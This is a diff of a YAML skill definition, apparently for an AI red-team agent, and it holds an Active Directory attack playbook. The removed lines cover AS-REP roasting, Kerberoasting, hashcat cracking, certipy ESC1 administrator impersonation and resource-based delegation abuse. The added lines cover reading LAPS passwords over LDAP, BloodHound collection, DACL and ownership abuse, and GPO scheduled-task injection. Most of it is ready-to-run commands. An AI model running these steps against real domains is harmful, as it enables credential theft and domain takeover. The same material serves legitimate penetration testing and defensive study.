@@ -1,68 +1,71 @@
 schema_version: 1
 version: 3.0.0
 name: active-directory
-description: Senior Active Directory and Kerberos domain assessment — Kerberoasting, AS-REP roasting, AD CS (ESC1-ESC17), delegation abuse, BloodHound collection, and DACL analysis.
+description: >
+  Active Directory domain architecture and identity assessment — LDAP directory querying, BloodHound
+  graph enumeration, DACL/ACE permission abuse (GenericAll, WriteDacl), GPO misconfigurations, and domain trust analysis.
 triggers:
   - active directory
   - ad
-  - kerberos
   - domain controller
-  - kerberoast
-  - kerberoasting
-  - asrep
-  - as-rep
   - bloodhound
-  - certipy
-  - adcs
-  - ad cs
-  - dcsync
-  - golden ticket
+  - ldap enum
+  - dacl abuse
+  - gpo abuse
+  - domain trusts
+  - laps
 tools:
   - netexec
-  - kerbrute
+  - rpcclient
+  - python3
 knowledge: |
-  Assess Active Directory and Kerberos environments like a senior red-team operator, focusing on misconfiguration chains, identity abuse, and certificate templates.
+  Assess Active Directory enterprise environments with senior red-team precision. Focus on structural
+  identity graphs, object ownership, discretionary access control lists (DACLs), and group policy objects.
 
-  1. ANONYMOUS & PRE-AUTHENTICATION ENUMERATION:
-     - Enumerate naming context and DC metadata via LDAP rootDSE:
-       `nmap -Pn -p 389 --script ldap-rootdse <dc_ip>`
-     - Kerberos Pre-Authentication User Enumeration (Zero Login Failures):
-       `kerbrute userenum -d <domain> --dc <dc_ip> $USERNAMES`
-     - AS-REP Roasting (No Domain Credentials Needed):
-       Extract crackable `$krb5asrep$23$` ticket hashes for accounts with `DONT_REQ_PREAUTH` enabled:
-       `GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip> -format hashcat`
-       Crack offline: `hashcat -m 18200 asrep.txt $PASSWORDS_TOP`
+  1. DOMAIN RECONNAISSANCE & LDAP QUERYING:
+     Identify domain architecture and Domain Controllers without causing excessive event noise:
+     - Anonymous / Guest LDAP bind test (Port 389 / 636):
+       ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" -s base "(objectClass=*)" namingContexts
+     - Authenticated Domain Enumeration:
+       Query domain functional level, forest trusts, and active domain controllers:
+       netexec ldap DC_IP -u 'USER' -p 'PASS' --query "(objectCategory=computer)"
+     - LAPS (Local Administrator Password Solution) Attribute Check:
+       Check if user has rights to read ms-Mcs-AdmPwd (plain-text local administrator password):
+       ldapsearch -x -H ldap://DC_IP -D "USER@DOMAIN" -w 'PASS' -b "DC=domain,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
 
-  2. AUTHENTICATED ENUMERATION & BLOODHOUND GRAPH MAPPING:
-     - Verify domain user credentials and password policy:
-       `netexec ldap <dc_ip> -u <user> -p <pass> --pass-pol`
-     - Collect BloodHound domain graph telemetry:
-       `bloodhound-python -d <domain> -u <user> -p <pass> -c All -ns <dc_ip> --zip`
-     - Prioritize analysis on: Shortest Paths to Domain Admins, Owned Principals, and High-Value Groups.
+  2. BLOODHOUND GRAPH ENUMERATION & SHORTEST PATH ANALYSIS:
+     Collect domain relationships and trust edges for graph-based pathfinding:
+     - Run collector (SharpHound / bloodhound-python):
+       bloodhound-python -u 'USER' -p 'PASS' -d domain.local -dc dc.domain.local -c All --zip
+     - High-Value Graph Queries:
+       • Shortest Paths to Domain Admins
+       • Shortest Paths to Unconstrained Delegation Systems
+       • Principals with DCSync (DS-Replication-Get-Changes-All) Rights
+       • Users with WriteDacl or GenericAll over high-privilege groups
 
-  3. KERBEROASTING (SPN Service Accounts):
-     - Request Kerberos TGS tickets for accounts possessing Service Principal Names:
-       `netexec ldap <dc_ip> -u <user> -p <pass> --kerberoasting /home/pentester/work/kerb.txt`
-       or `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<pass> -outputfile /home/pentester/work/kerb.txt`
-     - Crack captured service ticket hashes offline: `hashcat -m 13100 kerb.txt $PASSWORDS_TOP`.
+  3. DACL & OBJECT PERMISSION ABUSE:
+     When a compromised principal possesses write permissions over another AD object:
+     - `GenericAll` / `GenericWrite`:
+       Target is a User: Reset user password directly via shadow credentials or password reset.
+       Target is a Group: Add compromised account to target group (`net group "TargetGroup" USER /add /domain`).
+     - `WriteDacl`:
+       Grant compromised user full rights (`GenericAll`) over the target object, then execute control path.
+     - `WriteOwner`:
+       Take ownership of target object, grant own user `WriteDacl`, and escalate privileges.
 
-  4. ACTIVE DIRECTORY CERTIFICATE SERVICES (AD CS — ESC1 to ESC17):
-     AD CS misconfigurations represent the highest-yield modern domain privilege escalation vectors:
-     - Enumerate vulnerable certificate templates:
-       `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout`
-     - ESC1 Exploitation (Client Auth EKU + Enrollee Supplies SAN):
-       Request a certificate impersonating the Domain Administrator:
-       `certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vulnerable_template> -upn administrator@<domain>`
-       Authenticate using the obtained PFX certificate to extract Domain Admin NT hash:
-       `certipy auth -pfx administrator.pfx -dc-ip <dc_ip>`
+  4. GROUP POLICY OBJECT (GPO) MISCONFIGURATION:
+     Inspect writable GPOs applied to high-value organizational units (OUs):
+     - Identify GPOs where compromised user has Write / Edit permissions:
+       netexec smb DC_IP -u 'USER' -p 'PASS' --gpo
+     - Immediate scheduled task injection or startup script modification applied across all OU machines.
 
-  5. RESOURCE-BASED CONSTRAINED DELEGATION (RBCD):
-     When write access exists over a target computer object and `MachineAccountQuota > 0`:
-     • Create a fake computer account: `addcomputer.py -computer-name FAKE$ -computer-pass P@ss <domain>/<user>:<pass>`
-     • Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target to point to FAKE$.
-     • Execute S4U2Self and S4U2Proxy to obtain an administrator service ticket for the target host.
+  5. EVIDENCE & SITUATION HANDLING:
+     - If Kerberos pre-authentication or LDAP signing is enforced (`LDAP_STRONG_AUTH_REQUIRED`):
+       Switch transport to LDAPS (Port 636) with certificate validation flags.
+     - Document all queried principals, edge traversal paths, and permission grants.
 references:
-  - persona:active-directory-v3
+  - https://bloodhound.readthedocs.io/
+  - https://attack.mitre.org/tactics/TA0006/
 provenance:
   origin: builtin
   source: persona/v0.1/skills/active-directory.yaml
